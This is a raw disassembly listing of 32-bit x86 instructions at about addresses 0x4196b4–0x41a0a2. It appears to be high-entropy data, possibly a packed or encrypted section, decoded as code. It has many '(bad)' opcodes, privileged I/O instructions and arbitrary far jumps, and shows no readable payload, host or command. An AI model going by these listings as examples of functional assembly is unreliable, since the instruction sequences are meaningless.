  4196b4:	sahf   
  4196b5:	inc    edi
  4196b6:	xlat   BYTE PTR ds:[ebx]
  4196b7:	mov    ds:0x1ac12ae2,al
  4196bc:	imul   ebx,DWORD PTR [ebp+0x41b08fcb],0xffffffcc
  4196c3:	(bad)  
  4196c4:	or     DWORD PTR [eax+0x3e137e2d],edx
  4196ca:	jne    0x419701
  4196cc:	(bad)  
  4196cd:	call   0x5a03:0x97e23548
  4196d4:	test   al,0x6e
  4196d6:	or     BYTE PTR [ebp*4+0x633fd27d],dh
  4196dd:	jmp    0x419756
  4196df:	lods   eax,DWORD PTR ds:[esi]
  4196e0:	clc    
  4196e1:	jo     0x419720
  4196e3:	sbb    al,0x3b
  4196e5:	jge    0x41970f
  4196e7:	lock dec esi
  4196e9:	add    BYTE PTR [ecx],ch
  4196eb:	inc    edx
  4196ec:	mov    ch,0x6
  4196ee:	dec    esp
  4196ef:	sbb    BYTE PTR [edx+0x70b62b60],bh
  4196f5:	dec    edx
  4196f6:	dec    eax
  4196f7:	adc    al,0xa1
  4196f9:	pop    edi
  4196fa:	push   esp
  4196fb:	xor    dh,bl
  4196fd:	das    
  4196fe:	(bad)  
  4196ff:	mov    cl,0xc0
  419701:	inc    ecx
  419702:	clc    
  419703:	in     eax,0x17
  419705:	sbb    BYTE PTR [esi],0x70
  419708:	push   ebx
  419709:	inc    esp
  41970a:	add    bl,al
  41970c:	nop
  41970d:	bound  eax,QWORD PTR [edx]
  41970f:	outs   dx,BYTE PTR ds:[esi]
	...
  419774:	mov    bl,0x3f
  419776:	jno    0x4197dd
  419778:	std    
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x1e8dd0ae
  419781:	jnp    0x419759
  419783:	and    eax,ecx
  419785:	or     eax,0x1040001
  41978a:	add    BYTE PTR [eax],al
  41978c:	add    bh,bl
  41978e:	push   eax
  41978f:	sub    eax,DWORD PTR [ecx-0x746444a4]
  419795:	sub    dh,BYTE PTR [ebx]
  419797:	pop    es
  419798:	push   ecx
  419799:	push   0xffffffa1
  41979b:	inc    eax
  41979c:	sub    al,0x1a
  41979e:	stos   BYTE PTR es:[edi],al
  41979f:	mov    cl,0x7f
  4197a1:	dec    ebx
  4197a2:	mov    eax,ds:0x7ba991f5
  4197a7:	cld    
  4197a8:	push   ds
  4197a9:	or     bh,BYTE PTR [esi]
  4197ab:	in     al,dx
  4197ac:	sbb    BYTE PTR [eax+0x9],0xbc
  4197b0:	xchg   ebx,eax
  4197b1:	inc    ebx
  4197b2:	scas   al,BYTE PTR es:[edi]
  4197b3:	adc    al,0x76
  4197b5:	inc    esi
  4197b6:	cld    
  4197b7:	or     eax,0xee1da84
  4197bc:	sub    eax,DWORD PTR [esi-0x6f]
  4197bf:	mov    dl,0xcb
  4197c1:	mov    ebp,0xe8f98b84
  4197c6:	out    dx,eax
  4197c7:	std    
  4197c8:	mov    eax,ds:0x774fa239
  4197cd:	ja     0x4197ab
  4197cf:	pop    ebp
  4197d0:	xchg   ebp,eax
  4197d1:	push   ss
  4197d2:	cmp    eax,DWORD PTR [ecx+0x116262fb]
  4197d8:	cmp    dl,dh
  4197da:	cdq    
  4197db:	stos   DWORD PTR es:[edi],eax
  4197dc:	xchg   esp,eax
  4197dd:	mov    es,WORD PTR [ebx-0x51fa5c88]
  4197e3:	sub    BYTE PTR [esp+ecx*1-0x7933b228],0x21
  4197eb:	cmp    edi,esi
  4197ed:	mov    bl,0xe2
  4197ef:	or     DWORD PTR [eax-0x12],edi
  4197f2:	aad    0xbb
  4197f4:	inc    edx
  4197f5:	jo     0x419806
  4197f7:	je     0x41981d
  4197f9:	fisub  WORD PTR [ebp+0xa48e5e0]
  4197ff:	jle    0x4197a4
  419801:	out    dx,al
  419802:	inc    edx
  419803:	mov    DWORD PTR [ebx],esi
  419805:	dec    esp
  419806:	in     al,0x9
  419808:	stos   DWORD PTR es:[edi],eax
  419809:	push   es
  41980a:	jp     0x419814
  41980c:	mov    edi,0xe5265d20
  419811:	loopne 0x41979c
  419813:	lock inc eax
  419815:	mov    ah,0xc0
  419817:	scas   eax,DWORD PTR es:[edi]
  419818:	ret    
  419819:	xchg   edi,eax
  41981a:	mov    al,0xa4
  41981c:	in     eax,0xa9
  41981e:	adc    dl,ch
  419820:	xlat   BYTE PTR ds:[ebx]
  419821:	cmp    BYTE PTR ss:[esi+0x784ea910],cl
  419828:	fldcw  WORD PTR ds:0xac410a5a
  41982e:	push   ss
  41982f:	mov    BYTE PTR [eax+0x609ee5f3],dl
  419835:	(bad)  
  419836:	xchg   edi,eax
  419837:	cwde   
  419838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419839:	xor    DWORD PTR [edi-0x2c],edi
  41983c:	xchg   edi,eax
  41983d:	jno    0x41986c
  41983f:	xor    dl,BYTE PTR [edx]
  419841:	pop    ecx
  419842:	and    eax,0x1063b693
  419847:	ss jg  0x4197df
  41984a:	sub    al,0x2b
  41984c:	(bad)  
  41984d:	or     esi,DWORD PTR [eax-0x2a7d7bdc]
  419853:	xor    al,0x44
  419855:	xchg   ebx,eax
  419856:	dec    esp
  419857:	dec    edi
  419858:	arpl   cx,si
  41985a:	push   edx
  41985b:	dec    ebx
  41985c:	inc    edi
  41985d:	cdq    
  41985e:	jecxz  0x41983d
  419860:	mov    al,ds:0x17d31d08
  419865:	enter  0xf8a6,0x19
  419869:	mov    BYTE PTR [ebp-0x8ca4661],al
  41986f:	sahf   
  419870:	fsub   DWORD PTR [ecx+0x0]
  419873:	pop    eax
  419874:	sbb    al,0x64
  419876:	sti    
  419877:	loopne 0x419845
  419879:	mov    ds,WORD PTR [esi-0xa]
  41987c:	or     al,0x36
  41987e:	push   ebp
  41987f:	hlt    
  419880:	lods   al,BYTE PTR ds:[esi]
  419881:	and    DWORD PTR [ebx+edi*2-0x31b1f769],0x18a5bd7c
  41988c:	mov    esi,0x91c57d
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fnsave [ecx-0x3303fc26]
  419905:	push   cs
  419906:	add    DWORD PTR [eax],eax
  419908:	add    al,0x1
  41990a:	add    BYTE PTR [eax],al
  41990c:	not    bl
  41990e:	mov    ch,0x9b
  419910:	daa    
  419911:	jp     0x4198e8
  419913:	clc    
  419914:	scas   eax,DWORD PTR es:[edi]
  419915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419916:	push   ecx
  419917:	scas   al,BYTE PTR es:[edi]
  419918:	adc    BYTE PTR [edx-0x47],0x2e
  41991c:	push   ecx
  41991d:	lods   al,BYTE PTR ds:[esi]
  41991e:	into   
  41991f:	addr16 retf 
  419921:	and    BYTE PTR [ecx+0xa],bl
  419924:	adc    ebp,DWORD PTR [ebp+0x4f]
  419927:	in     al,dx
  419928:	sbb    BYTE PTR [ebx],bl
  41992a:	inc    edi
  41992b:	lods   al,BYTE PTR ds:[esi]
  41992c:	inc    edx
  41992d:	sahf   
  41992e:	sub    DWORD PTR ds:0xb45716a8,edx
  419934:	fcom   DWORD PTR [esi+0x43]
  419937:	stos   DWORD PTR es:[edi],eax
  419938:	aam    0x48
  41993a:	pop    eax
  41993b:	dec    ecx
  41993c:	cmp    edi,0x10
  41993f:	(bad)  
  419940:	(bad)  
  419941:	aad    0x61
  419943:	sbb    al,0x78
  419945:	mov    cl,0xa7
  419947:	test   BYTE PTR [eax-0x42],al
  41994a:	sti    
  41994b:	cmp    eax,0x1ff794e7
  419950:	rcr    ah,0xe1
  419953:	add    ebx,edi
  419955:	sahf   
  419956:	jne    0x419966
  419958:	xchg   ch,dh
  41995a:	mov    dh,0x6d
  41995c:	ret    0x6c07
  41995f:	test   eax,0x2a82c260
  419964:	pop    ds
  419965:	cdq    
  419966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419967:	mov    ds:0x1fa0e99d,al
  41996c:	dec    eax
  41996d:	popf   
  41996e:	mov    edx,0xb449c693
  419973:	or     DWORD PTR [ebx],esi
  419975:	or     dl,BYTE PTR ds:0xc1d0985d
  41997b:	mov    edi,0x12db064a
  419980:	pop    ecx
  419981:	test   al,0xc5
  419983:	clc    
  419984:	push   ecx
  419985:	or     eax,0xfc1037a4
  41998a:	mov    ax,ds:0xcae44b0b
  419990:	fcmove st,st(3)
  419992:	ins    DWORD PTR es:[edi],dx
  419993:	mov    WORD PTR [ebx+0x3b],?
  419996:	cmp    al,0xb8
  419998:	and    DWORD PTR [edx+0x4e8f2808],ecx
  41999e:	or     ecx,DWORD PTR [ebp+0x235079c7]
  4199a4:	mov    bh,0x96
  4199a6:	lods   eax,DWORD PTR ds:[esi]
  4199a7:	xchg   edx,esi
  4199a9:	mov    ebp,0x7e04af6
  4199ae:	test   ebp,edi
  4199b0:	lock daa 
  4199b2:	retf   
  4199b3:	inc    esi
  4199b4:	jns    0x41996a
  4199b6:	imul   ebp,ecx,0xffffffbb
  4199b9:	test   DWORD PTR [eax+ecx*2],edx
  4199bc:	or     esp,edi
  4199be:	lods   eax,DWORD PTR ds:[esi]
  4199bf:	push   edi
  4199c0:	mov    ss,WORD PTR [ebp-0x4d]
  4199c3:	and    BYTE PTR [edi],cl
  4199c5:	cdq    
  4199c6:	jmp    0x82ae:0xecaab01b
  4199cd:	push   ds
  4199ce:	inc    edx
  4199cf:	arpl   WORD PTR [esi],bx
  4199d1:	stc    
  4199d2:	jnp    0x419956
  4199d4:	sbb    eax,0x89866760
  4199d9:	and    eax,0x61ce67a
  4199de:	dec    eax
  4199df:	clc    
  4199e0:	mov    BYTE PTR ds:0x94ac85dd,ah
  4199e6:	dec    esp
  4199e7:	jp     0x419a06
  4199e9:	data16 mov dl,0x88
  4199ec:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4199ee:	bound  ecx,QWORD PTR ss:[edi+0x5d]
  4199f2:	mov    dh,0xfc
  4199f4:	rcr    DWORD PTR [edi],cl
  4199f6:	mov    es,WORD PTR [eax+0x56]
  4199f9:	mov    gs,WORD PTR [ebx+0x6d]
  4199fc:	xor    DWORD PTR ds:0x7dee3663,ecx
  419a02:	call   0x13b48778
  419a07:	pushf  
  419a08:	aas    
  419a09:	push   0x14
  419a0b:	push   esp
  419a0c:	push   cs
  419a0d:	or     cl,BYTE PTR [ebx+esi*2]
	...
  419a74:	xor    esi,DWORD PTR [ecx]
  419a76:	xchg   ebx,eax
  419a77:	lds    edx,FWORD PTR [ebx-0x34088819]
  419a7d:	rcl    DWORD PTR ds:0x242b2fc2,cl
  419a83:	push   ebx
  419a84:	ror    BYTE PTR [edi],1
  419a86:	add    DWORD PTR [eax],eax
  419a88:	add    al,0x1
  419a8a:	add    BYTE PTR [eax],al
  419a8c:	cmp    eax,0x59f7b075
  419a91:	std    
  419a92:	xchg   ebp,eax
  419a93:	xchg   ecx,eax
  419a94:	jmp    0x568a15b6
  419a99:	push   ecx
  419a9a:	pop    eax
  419a9b:	xchg   ebp,eax
  419a9c:	jl     0x419a60
  419a9e:	es add al,0xba
  419aa1:	stos   DWORD PTR es:[edi],eax
  419aa2:	(bad)  
  419aa3:	sbb    DWORD PTR [esi+ecx*8+0x1fef967c],edx
  419aaa:	pop    edx
  419aab:	push   es
  419aac:	outs   dx,BYTE PTR ds:[esi]
  419aad:	xchg   esp,eax
  419aae:	imul   ebx,DWORD PTR cs:[edi-0x22],0xffffffd8
  419ab3:	xor    ecx,DWORD PTR ds:0xd63d51a8
  419ab9:	adc    DWORD PTR [eax-0x6b0b0f91],0x2b
  419ac0:	inc    eax
  419ac1:	cmp    esi,DWORD PTR [edi]
  419ac3:	lahf   
  419ac4:	ret    0x8abd
  419ac7:	out    0xa2,eax
  419ac9:	call   0x61da414c
  419ace:	sbb    esi,DWORD PTR [ebx+0xb]
  419ad1:	sub    BYTE PTR [ebx-0x75],cl
  419ad4:	xchg   ebx,eax
  419ad5:	and    BYTE PTR [esp+esi*4],dl
  419ad8:	push   cs
  419ad9:	pushf  
  419ada:	or     bh,BYTE PTR [eax+0x7487c171]
  419ae0:	mov    eax,0x653e1012
  419ae5:	or     BYTE PTR [ebx],al
  419ae7:	int3   
  419ae8:	ins    DWORD PTR es:[edi],dx
  419ae9:	xchg   esp,ecx
  419aeb:	dec    edi
  419aec:	jnp    0x419a71
  419aee:	xor    BYTE PTR [esi],dl
  419af0:	add    al,0x8e
  419af2:	sbb    esi,DWORD PTR [edi+0x37db22a6]
  419af8:	cmp    eax,0x9cf92771
  419afd:	push   eax
  419afe:	mov    ch,0xe7
  419b00:	mov    bh,0x2f
  419b02:	ret    
  419b03:	cmp    DWORD PTR [esi],0x3bd44720
  419b09:	jae    0x419ac0
  419b0b:	loope  0x419adf
  419b0d:	dec    ecx
  419b0e:	sbb    eax,0x125644cb
  419b13:	in     al,0xf5
  419b15:	and    dh,BYTE PTR ds:0xbf9985f7
  419b1b:	xor    esi,edi
  419b1d:	mov    BYTE PTR [edx-0x55bfab49],al
  419b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b24:	es out 0x42,al
  419b27:	push   eax
  419b28:	fist   WORD PTR [edi]
  419b2a:	jne    0x419bab
  419b2c:	add    BYTE PTR [eax+0x7d],bl
  419b2f:	repz data16 add BYTE PTR [ebp-0x7ac87901],ah
  419b37:	and    esi,edx
  419b39:	(bad)  
  419b3a:	mov    al,0x4a
  419b3c:	add    al,0x39
  419b3e:	sti    
  419b3f:	dec    ebx
  419b40:	popf   
  419b41:	ja     0x419b91
  419b43:	scas   al,BYTE PTR es:[edi]
  419b44:	mov    bh,0x4f
  419b46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b47:	mov    ds:0xa4681c7f,eax
  419b4c:	xor    eax,0x6786fbd2
  419b51:	push   eax
  419b52:	cmp    eax,0xa271f017
  419b57:	cld    
  419b58:	lahf   
  419b59:	pop    ebp
  419b5a:	pop    ecx
  419b5b:	jns    0x419b0d
  419b5d:	fnstsw WORD PTR [ecx+0x55]
  419b60:	in     eax,0xda
  419b62:	aaa    
  419b63:	inc    edx
  419b64:	xchg   esi,eax
  419b65:	sub    esi,esp
  419b67:	xlat   BYTE PTR ds:[ebx]
  419b68:	leave  
  419b69:	sar    DWORD PTR [ecx],0xa1
  419b6c:	xor    eax,DWORD PTR [ecx-0x5]
  419b6f:	in     eax,dx
  419b70:	sbb    bh,BYTE PTR [edi]
  419b72:	je     0x419b86
  419b74:	hlt    
  419b75:	push   cs
  419b76:	add    al,0xab
  419b78:	in     eax,0x60
  419b7a:	cdq    
  419b7b:	jo     0x419bd8
  419b7d:	push   edi
  419b7e:	sbb    edi,DWORD PTR [esi+0x16]
  419b81:	dec    edi
  419b82:	xor    bh,BYTE PTR [eax]
  419b84:	scas   eax,DWORD PTR es:[edi]
  419b85:	xlat   BYTE PTR ds:[ebx]
  419b86:	sub    esi,DWORD PTR [edx]
  419b88:	xlat   BYTE PTR ds:[ebx]
  419b89:	push   eax
  419b8a:	icebp  
  419b8b:	call   0x0:0xd3a74bf6
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x21
  419c01:	and    ah,BYTE PTR [ebp-0x71]
  419c04:	aam    0x10
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    al,0x1
  419c0a:	add    BYTE PTR [eax],al
  419c0c:	jge    0x419c81
  419c0e:	shl    DWORD PTR [esp+eax*1],1
  419c11:	mov    eax,ds:0xa1431e28
  419c16:	jbe    0x419c90
  419c18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c19:	push   ebx
  419c1a:	xchg   edi,eax
  419c1b:	out    0xbc,eax
  419c1d:	into   
  419c1e:	sbb    DWORD PTR [edx+0x2d],esi
  419c21:	in     eax,dx
  419c22:	add    bl,BYTE PTR [eax-0x74]
  419c25:	rcr    BYTE PTR [esi-0x1],cl
  419c28:	jbe    0x419ca2
  419c2a:	push   eax
  419c2b:	sub    BYTE PTR [ecx],cl
  419c2d:	mov    esp,0xcbbfee49
  419c32:	mov    ch,0x73
  419c34:	test   eax,0xf8e33872
  419c39:	add    al,BYTE PTR [ecx+0x17]
  419c3c:	push   edi
  419c3d:	dec    edi
  419c3e:	mov    WORD PTR [edx-0x2add147e],gs
  419c44:	or     eax,0xe462ea51
  419c49:	ins    BYTE PTR es:[edi],dx
  419c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c4b:	inc    esi
  419c4c:	pushf  
  419c4d:	mov    ah,0x13
  419c4f:	out    0xcc,al
  419c51:	pop    ebx
  419c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c53:	dec    eax
  419c54:	push   edi
  419c55:	sub    DWORD PTR [ebx-0x34],esi
  419c58:	hlt    
  419c59:	or     eax,ecx
  419c5b:	cmp    al,0x78
  419c5d:	sbb    eax,0xa8310341
  419c62:	int    0xac
  419c64:	hlt    
  419c65:	jecxz  0x419c6f
  419c67:	xor    eax,0x9a5abdef
  419c6c:	cmp    DWORD PTR [edi+0x3627b954],edx
  419c72:	mov    bh,0xba
  419c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c75:	jmp    0xac3a0117
  419c7a:	lods   eax,DWORD PTR ds:[esi]
  419c7b:	push   0x166cb02d
  419c80:	add    dl,BYTE PTR cs:[ecx]
  419c83:	imul   ebx,DWORD PTR [edx+0x4a],0xe5816e1e
  419c8a:	icebp  
  419c8b:	shl    DWORD PTR [ecx],0x9e
  419c8e:	jle    0x419ce5
  419c90:	push   ecx
  419c91:	inc    ebx
  419c92:	aaa    
  419c93:	cmp    eax,0x270b17d5
  419c98:	xor    BYTE PTR [ebp-0xf],dl
  419c9b:	or     dh,BYTE PTR [edx+0x56]
  419c9e:	or     eax,0x1bc287cb
  419ca3:	mov    al,0x41
  419ca5:	fimul  WORD PTR [ecx]
  419ca7:	shr    bh,1
  419ca9:	int    0x7e
  419cab:	jg     0x419c35
  419cad:	mov    WORD PTR [ecx-0x2c7460fa],?
  419cb3:	frstor [ecx+0x74edc0bb]
  419cb9:	mov    eax,ds:0xa8102edd
  419cbe:	imul   esi,DWORD PTR [ecx+edi*1+0x33],0xffffff96
  419cc3:	aaa    
  419cc4:	xchg   edx,eax
  419cc5:	pop    esi
  419cc6:	xlat   BYTE PTR ds:[ebx]
  419cc7:	pop    esp
  419cc8:	mov    cs,WORD PTR [ebp-0x74a0586d]
  419cce:	fidivr WORD PTR [edx]
  419cd0:	(bad)  
  419cd1:	addr16 test al,0xcb
  419cd4:	stos   DWORD PTR es:[edi],eax
  419cd5:	add    DWORD PTR [esi+0x4aa0208a],esp
  419cdb:	xchg   ebp,eax
  419cdc:	dec    edi
  419cdd:	fisttp DWORD PTR [edx]
  419cdf:	or     al,0x41
  419ce1:	mov    dl,BYTE PTR [edx+0x301165bc]
  419ce7:	or     edx,0x2
  419cea:	out    dx,al
  419ceb:	fs fwait
  419ced:	mov    BYTE PTR [ecx+0x7b],dl
  419cf0:	mov    ebp,0x37ed0b46
  419cf5:	push   eax
  419cf6:	aaa    
  419cf7:	pop    eax
  419cf8:	(bad)  
  419cf9:	cmp    DWORD PTR [edi+edi*2-0xf],ebx
  419cfd:	out    0x42,al
  419cff:	scas   eax,DWORD PTR es:[edi]
  419d00:	(bad)  
  419d01:	stc    
  419d02:	aaa    
  419d03:	rcl    BYTE PTR [ecx+ebp*1-0x228cb8a7],0x66
  419d0b:	(bad)  
  419d0d:	jp     0x419cf4
  419d0f:	sub    al,BYTE PTR [eax]
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ficomp DWORD PTR ss:[edi-0x27bb012f]
  419d85:	adc    DWORD PTR [ecx],eax
  419d87:	add    BYTE PTR [ecx+eax*1],al
  419d8a:	add    BYTE PTR [eax],al
  419d8c:	jecxz  0x419de7
  419d8e:	push   ecx
  419d8f:	loop   0x419d1f
  419d91:	das    
  419d92:	rol    DWORD PTR [esi-0x755f94c4],1
  419d98:	mov    eax,ds:0xdcdd457d
  419d9d:	jnp    0x419df6
  419d9f:	push   eax
  419da0:	push   es
  419da1:	repz adc eax,0x740390ba
  419da7:	mov    ch,0x84
  419da9:	(bad)
  419dac:	xchg   ecx,eax
  419dad:	or     al,BYTE PTR [edx+ebx*4]
  419db0:	je     0x419d58
  419db2:	icebp  
  419db3:	paddusb mm0,QWORD PTR [ecx+0x2d32447b]
  419dba:	push   ds
  419dbb:	or     eax,0xd76ae84a
  419dc0:	rol    DWORD PTR ds:0xbe828f3a,1
  419dc6:	les    ecx,FWORD PTR ds:[ebp-0x7c1b1f3e]
  419dcd:	mov    bh,BYTE PTR [edx]
  419dcf:	dec    esi
  419dd0:	pop    eax
  419dd1:	ret    
  419dd2:	mov    esi,0x1ca3e881
  419dd7:	xor    esi,edx
  419dd9:	aas    
  419dda:	aaa    
  419ddb:	test   al,0x1f
  419ddd:	adc    edi,ecx
  419ddf:	out    0x88,al
  419de1:	sub    edx,DWORD PTR ss:[esi]
  419de4:	and    BYTE PTR [ecx+esi*4+0x44],dh
  419de8:	mov    ch,0xf4
  419dea:	push   esp
  419deb:	mov    bh,0x24
  419ded:	or     eax,0xdd59ed32
  419df2:	mov    dl,0x21
  419df4:	sub    DWORD PTR [esi-0x3afa0620],0xbcf9a124
  419dfe:	add    eax,0x7a0c1f0
  419e03:	jg     0x419e3e
  419e05:	pop    esp
  419e06:	in     al,dx
  419e07:	adc    eax,0x75036e05
  419e0c:	retf   0xdcf5
  419e0f:	hlt    
  419e10:	pop    ebp
  419e11:	or     bh,BYTE PTR ds:0xdac09855
  419e17:	aam    0xee
  419e19:	test   edx,ebx
  419e1b:	xor    al,0x63
  419e1d:	mov    ds:0x4bfe28d4,eax
  419e22:	push   esp
  419e23:	inc    ebp
  419e24:	xor    al,0xf4
  419e26:	or     DWORD PTR [edi-0x35],eax
  419e29:	shl    BYTE PTR [ecx+0x2a],cl
  419e2c:	jecxz  0x419e4b
  419e2e:	dec    ecx
  419e2f:	in     al,dx
  419e30:	mov    eax,ds:0x95a39d7a
  419e35:	pop    es
  419e36:	sub    ecx,DWORD PTR [edx]
  419e38:	(bad)  
  419e39:	cmp    BYTE PTR [edi-0x577bc6cb],dl
  419e3f:	mov    ebp,0xacf09b24
  419e44:	je     0x419e9f
  419e46:	or     al,0xe3
  419e48:	xor    DWORD PTR [edx-0x10c16a6f],edx
  419e4e:	add    BYTE PTR [edx+0x29f3a581],ah
  419e54:	rcr    BYTE PTR [edi],1
  419e56:	and    edx,DWORD PTR [ecx+0x16]
  419e59:	sub    edi,ecx
  419e5b:	pop    ss
  419e5c:	fsubrp st(2),st
  419e5e:	inc    edi
  419e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e60:	pushf  
  419e61:	or     ah,BYTE PTR [ebx+0x428797c2]
  419e67:	sahf   
  419e68:	scas   eax,DWORD PTR es:[edi]
  419e69:	(bad)  
  419e6a:	je     0x419ebf
  419e6c:	out    0xfa,al
  419e6e:	fdiv   st(4),st
  419e70:	mov    ah,0x7e
  419e72:	dec    edi
  419e73:	test   eax,0xa8d344ce
  419e78:	stc    
  419e79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e7a:	mov    al,ds:0x2b878ea8
  419e7f:	sub    BYTE PTR [ebp+0x226356dd],bh
  419e85:	addr16 mov ecx,0x2c1ab2c8
  419e8b:	inc    eax
  419e8c:	mov    bh,0xaf
  419e8e:	dec    esi
  419e8f:	mov    es,WORD PTR [eax]
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	(bad)  
  419f01:	and    DWORD PTR [esi+0x112dcf1],esi
  419f07:	add    BYTE PTR [ecx+eax*1],al
  419f0a:	add    BYTE PTR [eax],al
  419f0c:	or     al,0x74
  419f0e:	xchg   ebp,eax
  419f0f:	xchg   edx,eax
  419f10:	sbb    bl,ah
  419f12:	inc    edx
  419f13:	loopne 0x419efc
  419f15:	mov    esp,0x6cc064f9
  419f1a:	gs int 0x87
  419f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f1e:	int3   
  419f1f:	and    eax,0xb4f5ada2
  419f24:	xchg   ecx,eax
  419f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f26:	fist   DWORD PTR [eax]
  419f28:	movsx  edi,BYTE PTR [eax]
  419f2b:	leave  
  419f2c:	adc    esp,DWORD PTR [eax]
  419f2e:	push   ss
  419f2f:	adc    DWORD PTR [esi],ecx
  419f31:	mov    ah,0xc9
  419f33:	jbe    0x419f97
  419f35:	sbb    BYTE PTR [ebp+0x76],cl
  419f38:	inc    esp
  419f39:	cmp    bl,cl
  419f3b:	cmp    ecx,DWORD PTR [esi+0x47]
  419f3e:	ja     0x419f18
  419f40:	xor    esi,DWORD PTR [eax]
  419f42:	mov    ebp,0xcd4e4a73
  419f47:	and    edx,esi
  419f49:	add    ecx,esi
  419f4b:	aam    0xa6
  419f4d:	in     al,0x63
  419f4f:	shl    BYTE PTR [ecx+0x79],1
  419f52:	test   eax,0x5ccfbd56
  419f57:	out    0x85,eax
  419f59:	inc    edx
  419f5a:	push   eax
  419f5b:	jecxz  0x419efe
  419f5d:	sahf   
  419f5e:	inc    esi
  419f5f:	push   edx
  419f60:	cmc    
  419f61:	ss inc ebx
  419f63:	sub    al,BYTE PTR [ebp+0x1c]
  419f66:	push   ss
  419f67:	xchg   esi,eax
  419f68:	mov    WORD PTR fs:[edx],si
  419f6c:	ja     0x419fd7
  419f6e:	pop    ebp
  419f6f:	je     0x419f9a
  419f71:	xchg   esi,eax
  419f72:	imul   esi,DWORD PTR [ecx],0xffffffa3
  419f75:	push   es
  419f76:	fldenv [ebp-0xf]
  419f79:	cmp    BYTE PTR [edi],bh
  419f7b:	pop    eax
  419f7c:	(bad)  
  419f7d:	jo     0x419f8e
  419f7f:	xor    BYTE PTR [ebx],dh
  419f81:	sub    al,0xc5
  419f83:	and    BYTE PTR [eax-0x4f],ah
  419f86:	mov    esp,0x50ad94e3
  419f8b:	mov    ebp,ds
  419f8d:	push   ebx
  419f8e:	div    al
  419f90:	and    BYTE PTR [edi+0x4404ea19],bh
  419f96:	(bad)  [eax]
  419f98:	out    dx,al
  419f99:	ret    0xa38e
  419f9c:	and    al,0x52
  419f9e:	cmp    eax,0xa54ea15
  419fa3:	pop    es
  419fa4:	pushf  
  419fa5:	bound  eax,QWORD PTR [edi-0x317d61c4]
  419fab:	lahf   
  419fac:	xor    DWORD PTR [esi+0x4797b2fd],ebx
  419fb2:	cvtdq2ps xmm2,XMMWORD PTR [ebx+0x53f38c9a]
  419fb9:	loope  0x41a00b
  419fbb:	pop    esp
  419fbc:	push   ecx
  419fbd:	ret    0xa54d
  419fc0:	popf   
  419fc1:	leave  
  419fc2:	add    al,0x60
  419fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fc5:	push   cs
  419fc6:	clc    
  419fc7:	push   ss
  419fc8:	clc    
  419fc9:	mov    edx,0x9f618e45
  419fce:	mov    BYTE PTR [ecx-0x27],dl
  419fd1:	std    
  419fd2:	or     al,0x16
  419fd4:	sti    
  419fd5:	sbb    BYTE PTR [ecx+0x46f5b030],ah
  419fdb:	fdiv   DWORD PTR [edx-0x16fa7d9a]
  419fe1:	mov    ch,0xa5
  419fe3:	push   0xd582b486
  419fe8:	add    DWORD PTR [ebp+0x64],ecx
  419feb:	jne    0x41a01e
  419fed:	mov    ebp,0xcd99ca58
  419ff2:	sub    al,0xbb
  419ff4:	leave  
  419ff5:	pop    edx
  419ff6:	mov    cl,0x66
  419ff8:	pusha  
  419ff9:	sbb    BYTE PTR [edi],ah
  419ffb:	popf   
  419ffc:	add    ah,dh
  419ffe:	cli    
  419fff:	cmp    BYTE PTR [edx+0x25],0x18
  41a003:	(bad)  
  41a005:	mov    eax,ds:0x83a79b1c
  41a00a:	jae    0x41a051
  41a00c:	inc    ebp
  41a00d:	mov    eax,0x3942
	...
  41a072:	add    BYTE PTR [eax],al
  41a074:	dec    esi
  41a075:	jmp    0x41a0a1
  41a077:	dec    esi
  41a078:	scas   eax,DWORD PTR es:[edi]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x58],bh
  41a081:	xchg   ecx,eax
  41a082:	mov    dl,0xd0
  41a084:	loopne 0x41a099
  41a086:	add    DWORD PTR [eax],eax
  41a088:	add    al,0x1
  41a08a:	add    BYTE PTR [eax],al
  41a08c:	sbb    ch,cl
  41a08e:	push   ss
  41a08f:	pop    ds
  41a090:	shl    BYTE PTR [ebp-0x32c92e9e],1
  41a096:	and    DWORD PTR [edi-0x19],0x1b1e19fb
  41a09d:	out    dx,eax
  41a09e:	pop    ebp
  41a09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0a0:	inc    esp
  41a0a1:	push   ds
  41a0a2:	adc    BYTE PTR [esi+0x37f7f86e],dl
